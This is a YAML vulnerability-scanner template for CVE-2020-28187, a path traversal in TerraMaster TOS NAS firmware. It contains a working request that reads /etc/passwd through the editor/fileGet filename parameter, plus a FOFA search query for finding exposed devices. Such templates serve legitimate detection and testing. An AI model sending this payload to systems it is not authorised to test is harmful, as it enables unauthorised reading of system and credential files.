expression: r0()
id: CVE-2020-28187
info:
  author: PeiQi
  description: "TerraMaster TOS <= 4.2.06\u4E2D\u7684\u591A\u4E2A\u76EE\u5F55\u904D\
    \u5386\u6F0F\u6D1E\u5141\u8BB8\u8FDC\u7A0B\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u653B\
    \u51FB\u8005\u901A\u8FC7/tos/index.php?editor/fileGet\u8DEF\u5F84\u4E0B\u7684\
    filename\u53C2\u6570\u3001 /include/ajax/logtable.php\u8DEF\u5F84\u4E0B\u7684\
    Event\u53C2\u6570\u548C/include/core/index.php\u8DEF\u5F84\u4E0B\u7684opt\u53C2\
    \u6570\uFF0C\u8BFB\u53D6\u6587\u4EF6\u7CFB\u7EDF\u4E2D\u7684\u4EFB\u4F55\u6587\
    \u4EF6\u3002\nTerraMaster TOS < 4.2.06 FOFA: \"TerraMaster\" && header=\"TOS\"\
    \n"
  name: "TerraMaster TOS \u540E\u53F0\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\
    \ CVE-2020-28187"
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-28187
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/TerraMaster/TerraMaster%20TOS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2020-28187.md
  severity: critical
rules:
  r0:
    expression: 'response.status == 200 && response.body.bcontains(b''"code":true'')
      && response.body.bcontains(b''../../../../../../etc/passwd'')

      '
    request:
      method: GET
      path: /tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd
